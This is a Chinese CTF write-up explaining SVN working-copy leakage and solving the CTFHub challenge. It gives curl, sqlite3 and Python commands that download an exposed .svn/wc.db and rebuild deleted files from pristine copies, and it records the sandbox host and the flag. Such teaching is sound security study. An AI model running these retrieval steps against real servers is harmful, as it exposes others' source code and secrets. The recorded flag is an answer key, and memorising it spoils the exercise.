## SVN泄露 -- 考点精讲

> 前置知识：[[../Web前置技能/HTTP协议/HTTP协议|HTTP 协议基础]] -- 先了解 HTTP 协议基础再来看本考点
>
> 关联教程：[[Git泄露|Git 泄露]] -- .git 与 .svn 都是版本控制元数据泄露，但原理和工具链不同

### 原理精讲 -- SVN 工作副本为什么会泄露源码？

#### SVN 工作副本（WC）是什么

`svn checkout` 会在项目根目录生成 `.svn/`，把**仓库元数据和所有文件内容的基础副本**留在本地：

```mermaid
flowchart LR
    A[开发者 svn checkout] --> B[生成 .svn/]
    B --> C[开发者把项目部署到 web 服务器]
    C --> D[/.svn/wc.db 可直接 HTTP 下载]
    D --> E[解密 SQLite → 拿到文件清单]
    E --> F[下载 pristine 基础副本 → 还原源码]
```

#### SVN 1.7+ 工作副本目录结构

```
.svn/
├── format            ← 数字 "12" = SVN 1.7+ 格式
├── entries           ← 1.7+ 只放格式号占位（1.6 及以前这里才有文件清单）
├── wc.db             ← SQLite 数据库：全部文件路径/状态/checksum 元数据
└── pristine/
    └── <sha前2位>/
        └── <完整40位sha>.svn-base   ← 每个文件内容的"基础副本"
```

| 文件 | 作用 | 泄露价值 |
|------|------|---------|
| `format` | 格式版本号（12=1.7+） | 判断走了哪条利用路径 |
| `entries` | 1.7+ 只是占位（内容=12），1.6 及以前才有文件清单 | 判断版本 |
| **wc.db** | SQLite 元数据（NODES + PRISTINE 表） | **文件名 + sha1 checksum + 状态** |
| `pristine/<2>/<40>.svn-base` | 文件内容的"基础副本" | **源码/flag 内容** |

#### 为什么文件删了还能泄露？

SVN 的 pristine 基础副本是**按内容 sha 存储的**——即使工作副本里文件被删除（`svn delete` 或手动删除），只要 pristine 行没被清理（`svn cleanup`），基础副本就一直存在。这就是"文件在最新版本里已删除，却能从 pristine 拿到"的原因。

#### 关键暴露点（确认泄露的方法）

```bash
# 最小确认集（三个请求）
curl -s -o /dev/null -w "%{http_code}" "http://目标/.svn/format"    # 200 + "12" → 1.7+
curl -s -o /dev/null -w "%{http_code}" "http://目标/.svn/wc.db"     # 200 + 大文件 → 元数据泄露
curl -s -o /dev/null -w "%{http_code}" "http://目标/.svn/entries"   # 200 + "12" → 占位
```

| 状态 | 含义 |
|------|------|
| `format`=12 + `wc.db` 200（>10KB） | **SVN 1.7+ 泄露**，元数据在 wc.db |
| `entries` 有文件清单（非 "12"） | SVN 1.6 老格式，元数据在 entries |
| `pristine/xx/xxx.svn-base` 200 | 内容副本可直下 |

### 注意事项

| 易错点 | 说明 |
|-------|------|
| **pristine 文件名是完整 40 位 sha** | 路径 = `/.svn/pristine/<前2位>/<**完整40位**>.svn-base`，**不是**去前2位 |
| **flag 文件可能 not-present** | wc.db 里标记为"已删除"的文件，pristine 仍可能存在（本题正是如此） |
| **entries 内容无意义** | SVN 1.7+ 的 entries 只是 "12"，元数据全在 wc.db |
| **wc.db-journal 不一定有** | 未提交事务的残留文件，可能 404 |
| **text-base 是 1.6 老路径** | SVN 1.6 的文件备份在 `.svn/text-base/<文件名>.svn-base`，1.7+ 改用 pristine |

### 题目解法

> CTFHub 技能树位置：CTFHub → Web → Web 信息泄露 → SVN泄露

#### 手工三连

```bash
# 1. 确认泄露
curl -s -o /dev/null -w "%{http_code}" "http://目标/.svn/wc.db"
# 200 + 大文件 = 泄露

# 2. 下载 wc.db，解析文件清单和 checksum
curl -s "http://目标/.svn/wc.db" -o wc.db
sqlite3 wc.db "SELECT path,presence,checksum FROM NODES;"
# flag_1804218695.txt  not-present  $sha1$aae9bea229cf7fe9085c2556bb9f39adc5ad0b4d
# index.html           normal       $sha1$bf45c36a4dfb73378247a6311eac4f80f48fcb92

# 3. 按完整 40 位 sha 下载 pristine 基础副本（关键坑：文件名是完整 sha！）
curl -s "http://目标/.svn/pristine/aa/aae9bea229cf7fe9085c2556bb9f39adc5ad0b4d.svn-base"
# ctfhub{...}
```

#### 工具一键（svndump）

```bash
# svndump：解析 wc.db + 自动下载 pristine + cat 出 flag
svndump http://目标

# 选项
svndump http://目标 --list        # 只列出条目，不下载
svndump http://目标 --out 目录     # 指定输出目录
svndump http://目标 --cat flag_xxx.txt  # 直接 cat 指定文件
```

#### 手动对象链（理解原理）

```bash
# 1. 下载 wc.db（122KB，SQLite）
curl -s "http://目标/.svn/wc.db" -o wc.db

# 2. 解析所有条目（无 sqlite3 时用 strings 替代）
strings wc.db | grep -aE 'flag|sha1\$'
# flag_1804218695.txt flag_1804218695.txt not-present
# index.html index.html normalfile $sha1$bf45c36a4dfb73378247a6311eac4f80f48fcb92

# 3. 提取 sha1（Python 单行）
python3 -c "import re; [print(s.decode()) for s in re.findall(rb'\\$sha1\\$([0-9a-f]{40})', open('wc.db','rb').read())]"
# aae9bea229cf7fe9085c2556bb9f39adc5ad0b4d
# bf45c36a4dfb73378247a6311eac4f80f48fcb92

# 4. 拼 pristine 路径下载（注意：文件名 = 完整 40 位，不是 38 位）
# 错误写法：/.svn/pristine/aa/e9bea229cf7fe9085c2556bb9f39adc5ad0b4d.svn-base  → 404！
# 正确写法：/.svn/pristine/aa/aae9bea229cf7fe9085c2556bb9f39adc5ad0b4d.svn-base  → 200
curl -s "http://目标/.svn/pristine/aa/aae9bea229cf7fe9085c2556bb9f39adc5ad0b4d.svn-base"
# ctfhub{...}
```

### 本题实战记录

| 数据 | 值 |
|------|-----|
| 靶机 | `challenge-af3335617c3becb1.sandbox.ctfhub.com:10800` |
| SVN 格式 | 1.7+（format=12） |
| wc.db 大小 | 122880 字节 |
| flag 文件名 | `flag_1804218695.txt`（状态：not-present） |
| flag sha1 | `aae9bea229cf7fe9085c2556bb9f39adc5ad0b4d` |
| flag pristine | `/.svn/pristine/aa/aae9bea229cf7fe9085c2556bb9f39adc5ad0b4d.svn-base` |
| index sha1 | `bf45c36a4dfb73378247a6311eac4f80f48fcb92` |
| flag 内容 | `ctfhub{bc6babbb1b641ec972ba5508}` |
| 仓库 URL（REPOSITORY） | `file:///opt/svn/ctfhub...` |
| 踩坑点 | pristine 文件名是**完整 40 位 sha**，不是去掉前 2 位 |

### 同类变式（信息泄露大类）

| 考点 | 说明 | 终端提取 |
|------|------|---------|
| **SVN 泄露**（本题） | .svn 目录可访问，wc.db + pristine 全泄露 | `svndump URL` |
| **HG 泄露** | `.hg/` 目录可访问，fncache + revlog 全泄露 | `hgdump URL` |
| **SVN 泄露（1.6 老格式）** | .svn/text-base/ 备份目录可访问 | `svndump URL`（自动检测） |
| Git 泄露 | .git 目录可访问，历史源码全还原 | `gitdump URL` 或 `githack URL` |
| Git stash 变式 | flag 被 git stash 收进 refs/stash | `git stash list` + `git stash apply` |
| Git index 变式 | flag 仅在暂存区，不在提交树里 | `git ls-files -s` + `git cat-file -p` |
| .DS_Store | macOS 目录元数据泄露文件清单 | `dsstore URL/.DS_Store` |
| 目录索引泄露 | 目录列表直接可见文件名 | 见 [[../目录遍历|目录遍历]] |
| phpinfo | 环境变量/配置泄露 | 见 [[../phpinfo|phpinfo]] |

### 核心知识点总结

| 概念 | 说明 |
|------|------|
| `.svn/wc.db` | SQLite 元数据，暴露全部文件路径 + sha1 checksum + 状态 |
| `format=12` | SVN 1.7+ 格式（1.6 及以前 entries 有文件清单） |
| pristine 基础副本 | 文件内容备份，路径 = `pristine/<前2位>/<完整40位>.svn-base` |
| not-present | 文件已从工作副本删除，但 pristine 可能仍存在 |
| **文件名 = 完整 40 位** | 核心易错点：去前2位拼 38 位会 404 |
| `svn export` vs `svn checkout` | `export` 不生成 .svn，部署时应用 `export` |
| 防御角度 | 部署不带 .svn；使用 `svn export` 代替 `svn checkout`；Nginx/Apache 禁止访问 .svn |

### 关联教程

- [[Git泄露|Git 泄露]] -- .git 与 .svn 同属版本控制泄露，但对象模型不同
- [[HG泄露|HG 泄露]] -- .hg 与 .svn 同属版本控制泄露，但格式不同（SQLite vs 明文 revlog）
- [[../../../../../git.md#nav-17|git.md 17 章内部原理与文件存储]] -- git 对象模型与 svn pristine 的类比
- [[../备份文件下载/bak文件|bak文件]] -- 单文件备份直接泄露源码
- [[../备份文件下载/vim缓存|vim缓存]] -- .swp 文件泄露源码
- [[../备份文件下载/DS_Store|DS_Store]] -- macOS 目录元数据泄露
- [[../../Web|Web 方向总览]] -- Web CTF 方向入口
- [[../../../ctf解法与理论总目录|CTF 总目录]] -- CTF 理论学习与练习平台
